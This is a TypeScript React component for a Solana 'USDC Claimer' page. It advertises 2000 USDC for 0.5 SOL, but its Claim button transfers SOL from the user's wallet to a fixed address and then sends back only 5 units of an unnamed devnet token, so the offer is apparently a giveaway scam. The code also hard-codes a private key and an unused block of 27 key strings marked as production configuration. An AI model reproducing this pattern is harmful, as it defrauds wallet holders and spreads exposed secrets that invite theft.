/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4rVnv6of2Z9z8iHuqB7eZ8wdUhkSUtSMozt5qNoBMXxk7vYntH5RAnXmKkkfY6KpQJZAQ6SkWaJj764GsqFFVBcn"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3i3ZXjxsPZq3Q6qTf8rirJzB4z5jNHVKpT1B18HM4cwjYPMaEUybqWSiErM4nVRtHymA6kLg7sY7F162dqKqJzth",
  "key1": "4iU7jp23f7bBNG4b68zyPYowXxnNKhziMzya1V5DZzKeVtJudTA13XV2nWBnJwjDi4gX6GuvQK2TLY1gpYCuNZxR",
  "key2": "3g4ZCb8u71Prt22dZc9hLAcBHHKq6Lkg3unpD9brCxTTLHuHYtc6QBUtW8nKRJcb3AH3bHY8HciDhj3CeX9mZCHv",
  "key3": "5m2Z8Xrjkr5a2Fzh9xMTVc7gFPokYq5buA6GZ9QYuuuwPKWcoLBg8diH8GwUjiN8Wvtw3ypuPrtXSUzGeRDUrtWT",
  "key4": "2as5sDjYT2ZDzivmWLUJ126QFePzJioEQLzf2hmJU1juovPtD73V1wtzoDf5CoEDP3PTvTVyV2CjV1xPrC48pnVs",
  "key5": "3C5jiLMN9obWtbJ1mLEVh8UQPYRTWgG4CTAmrpKgqV81rwsHo8y6earNengBM9sV2oCeUwPzmfzsk6thFksJFP5X",
  "key6": "4uzA8U7GHHocvqU5MfUDdk9d2KXpDBCKDp1WYKE9RFgvkM6qN84WS7trQPFtuvN4UzVk8GgEQkETH78vJ53o7Xmp",
  "key7": "48JwHujGZHSJenXhzfESKqX4GpCagGbNeX9roodMhAxhgG3rqjQYAWUksw3NrQFBYzdDNpXv9L8XeahAtkHDjBsm",
  "key8": "3hMq1QGy55EbCcx4VmdkGUMZdJHyQRDzU3qihHeA8j33RffpshAX7Eb2eHCBTH1ZzVGeSMzK6k9smnM6Xy9H3FeV",
  "key9": "47EXGQtWB1Pw7xdEmqwn8HfHzLJ4yVbhQG2u6V2QswXKECE9ryuhoum1e7G7MbbBYPyob6STf4KVT8fcc6i6HXDs",
  "key10": "4xAUXDpDGXGAPhGv4qAmyHh4dxN1b9tuv6utBtpgGfpP1vCgPyA2QQgMcEuKme3YCu8f7jFz5T2SGETbL3szxezg",
  "key11": "5ENAfLYjekWXrkDxqBYNS22bhEk8xyLHkJneTYsyzGWWjuYWEmvhnQ8WYC1Q4vruH8UE5hW8KYTm4CNTyrNjJGsf",
  "key12": "4sNATxx6WzpoyYiWF7Jnx58vAyXUryKHrz52HAjmp8zkifqGU9CFiKCP4MnhDv9y2cHBbqe15Dv4HvEhqJjXEaMM",
  "key13": "2AQoj3ZLnz3ZcjrrHS19RNpC5y5BqgBjQn9vhRY2UZdP8NDW627h9ikk3XVMUU22rPhgBgs8AH8CneHyvrFWbmnr",
  "key14": "51r95HDgsfy2tfHR5QrfEiEB98eQFbxec3joWgArcbihreKJBoG5CU7DdPogk3bWX37kYfsQN8UnK38A3msc1Po7",
  "key15": "JKZjUD5q32s9WtM2aPok3fnmKpAMz4b8htViV7rDN2tKCgqHsjWQhYASommjFYSwK6zHsSgihCW2HGQjLWG44fm",
  "key16": "4PSsb1mYMgu7BpL99sxZbYZpjxs1P6SNTptX3w8eaQkdSncZ5NufmHofFFnKNEnh5QWuGGfVTxf1oS8rbjGxdnxL",
  "key17": "38zrXtxQPiadAZahWDJi5Vtd6FxHGX4QMP4RRhgaiVeYVUnW45HypLYUa9dc8MGstoh72FRPZ541U6tutcQzqYET",
  "key18": "3x3iVmrgHj8M29WzTAbQHYEnkwFiYrJq3ZVWgmFnRWcey24dRbFWGb3AXEix2w6CdAjyfgTZpnoMVcKQiiogbBXx",
  "key19": "3RBsfUqbyVvBfQeU5YGUhADWQ4RXXfJL56pJuDgoTidSSsxXeGCbDxX1nBw7MvZ4gJMtgr5vTUuqwk1yQ5WJLQte",
  "key20": "2uiVacGy8vsvcNVAdPMfLfi9C9gprgmKYeRYF6G5kLZS6N1YwjDDLTGTqEwNn5SswNj6fHEwcRuyCCqgKDsQ3kTm",
  "key21": "39oAfjWEywzMyU9z4nVd3egyqS23MVRxoL7TLNFz4wD48hE1httZMjELUVcBRNE135nQueNHfsmY5bW77N7MHKfq",
  "key22": "4VUxW3iN5KqLfD87bYMt4AfyPFuCQFJpKv577UmgJKipZnpGuBgRC71FahMWFckvJqcdG56g2DhL2uZS9q54iQ7Q",
  "key23": "2tTKUz4LRYE9t6VQJthp1Xkf9DZbNX463dLLJoVsYu6FQmVRVdczUyas6Cjk2YqBCKX1bpHJ6afv1RLzCas1oCjm",
  "key24": "3NxHmUJWWEJTpAfTAfTfM3uBHq5TQYnH7pLbBCKQwzo4PakSg6EYDkRZxKEwc4hyS344uHhmGKVcMZdYVuFkh6BR",
  "key25": "2U57mKUh448Vu3V69n3XYh7eqMzwD5N5qUZDxDVENUw1TtcfXwhvCmcw1ot3vYy2rmTwfGCPX1c61L2FXYK34FRo",
  "key26": "3GRtiCFsE9LMimuo4cqTEc8FwDZbtzCDbAtK9zctD9BCffYTDVcxxaAz8DmWggcsDV28SAhTqQ26W1N4xawwgcA1"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
